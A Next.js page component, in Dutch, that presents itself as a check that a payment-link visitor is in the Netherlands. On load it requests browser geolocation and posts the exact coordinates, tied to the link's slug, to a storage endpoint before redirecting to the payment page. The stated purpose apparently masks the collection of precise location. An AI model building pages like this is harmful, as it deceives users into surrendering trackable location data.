import { useEffect, useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [error, setError] = useState(false);

  const requestLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch('/api/store-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            slug,
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          }),
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      () => setError(true)
    );
  };

  useEffect(() => {
    requestLocation();
  }, []);

  return (
    <div
      style={{
        padding: '2rem',
        fontFamily: 'sans-serif',
        textAlign: 'center',
      }}
    >
      <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>

      <p>
        Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
      </p>

      <p>
        <a
          href="#"
          onClick={(e) => {
            e.preventDefault();
            requestLocation();
          }}
          style={{ color: '#0066cc', textDecoration: 'underline' }}
        >
          Klik hier om te bevestigen dat je uit Nederland komt
          (locatie-instellingen)
        </a>
      </p>

      {error && (
        <p style={{ color: 'red', marginTop: '1rem' }}>
          Locatie is verplicht om verder te gaan.
        </p>
      )}
    </div>
  );
}
